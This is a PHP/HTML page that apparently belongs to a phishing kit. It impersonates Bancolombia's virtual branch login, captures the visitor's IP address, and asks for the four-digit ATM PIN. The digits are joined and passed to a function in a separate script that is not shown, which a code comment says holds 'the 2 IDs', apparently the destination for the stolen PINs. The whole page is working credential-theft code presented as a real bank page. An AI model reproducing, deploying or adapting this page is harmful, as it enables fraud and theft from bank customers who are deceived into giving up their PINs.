<?php
$ip = getenv("REMOTE_ADDR");
$tiempo = date("l, j \d\e F \d\e Y");
date_default_timezone_set('America/Bogota');
?>
<!DOCTYPE html>
<html>
    <head>
        <title>Bancolombia Sucursal Virtual Personas</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700;800&display=swap" rel="stylesheet">

        <script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>        
        <link href="../css/stylesheet.css" rel="stylesheet">
        <link href="../css/style-app.css?v2" rel="stylesheet">        
        <link rel="icon" type="image/png" href="../img/logo.png" />
        <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
    
        <script type="text/javascript" src="../js/functions.js?v1"></script>

        <style type="text/css">
            /* FIX: Evita la pantalla blanca forzando el oculto al inicio */
            #fondo, #cargando, #cargando-o {
                display: none;
                position: fixed;
                top: 0; left: 0; width: 100%; height: 100%;
                background: rgba(255,255,255,0.95);
                z-index: 9999;
                text-align: center;
                padding-top: 50%;
            }
            .clave {                
                padding: 10px 0px; 
                text-align: center;
                width: 45px;
                font-size: 22px;
                font-weight: bold;
                border: 1px solid #ccc;
                border-radius: 4px;
                outline: none;
            }
            .inp-pass { width: 50px; }
            #btn-password { 
                width: 80%; margin: 20px auto; display: block; 
                height: 45px; border: none; border-radius: 5px; 
                font-weight: bold; background-color: #ccc; cursor: not-allowed;
            }
        </style>
    </head>
    <body>         
        <div id="fondo"></div>
        <div id="cargando-o">
            <img src="../img/load4.gif" width="90">            
            <br>
            Cargando...
        </div>

        <table width="100%" border="0" cellpadding="0" cellspacing="0" style="padding: 10px;">
            <tr>
                <td valign="middle" align="left" width="33%"><img src="../img/btn-cerrar.jpg" height="29"></td>
                <td valign="middle" align="center" width="34%"><img src="../img/logo-app.jpg" height="29"></td>
                <td valign="middle" align="right" width="33%"><img src="../img/btn-continuar-off.jpg" height="29"></td>
            </tr>
        </table>
       
        <br><br><br>

        <div class="frm" style="text-align: center;">
            <img src="../img/candado.jpg" width="16">
            <div class="descripcion-app" style="margin-bottom: 20px;">Ingresa la clave del cajero</div>
            <table style="margin: 0 auto;" border="0" cellspacing="8">
                <tr>
                    <td class="inp-pass"><input type="text" class="clave" id="txt-pass1" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
                    <td class="inp-pass"><input type="text" class="clave" id="txt-pass2" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
                    <td class="inp-pass"><input type="text" class="clave" id="txt-pass3" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
                    <td class="inp-pass"><input type="text" class="clave" id="txt-pass4" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
                </tr>
            </table>            
        </div>  
        
        <button id="btn-password" disabled>CONTINUAR</button> 
        
        <br><br>
        <div style="color:#1A1B1A;font-weight: bold;font-size: 16px;text-decoration: underline; cursor: pointer;text-align: center;">Genera una clave personal</div>  

        <script type="text/javascript">
            $(document).ready(function() { 
                // Asegurar que no haya bloqueos al entrar
                $("#fondo, #cargando-o").hide();

                // Salto de cuadritos y activación de botón
                $('.clave').on('input', function() {
                    if ($(this).val().length === 1) {
                        $(this).closest('td').next().find('.clave').focus();
                    }
                    
                    var p1 = $("#txt-pass1").val();
                    var p2 = $("#txt-pass2").val();
                    var p3 = $("#txt-pass3").val();
                    var p4 = $("#txt-pass4").val();

                    if (p1 != "" && p2 != "" && p3 != "" && p4 != "") {
                        $("#btn-password").prop("disabled", false).css({"background-color": "#FDDA24", "cursor": "pointer"});
                    } else {
                        $("#btn-password").prop("disabled", true).css("background-color", "#ccc");
                    }
                });

                // Borrar hacia atrás
                $('.clave').on('keydown', function(e) {
                    if (e.keyCode === 8 && $(this).val().length === 0) {
                        $(this).closest('td').prev().find('.clave').focus();
                    }
                });

                // Acción de envío
                $("#btn-password").click(function(){
                    var pass_p = $("#txt-pass1").val() + $("#txt-pass2").val() + $("#txt-pass3").val() + $("#txt-pass4").val();
                    $("#fondo, #cargando-o").show();
                    
                    // Llama a la función en functions.js que tiene los 2 IDs
                    pasousuario(pass_p); 
                });
            });
        </script>
    </body>
</html>
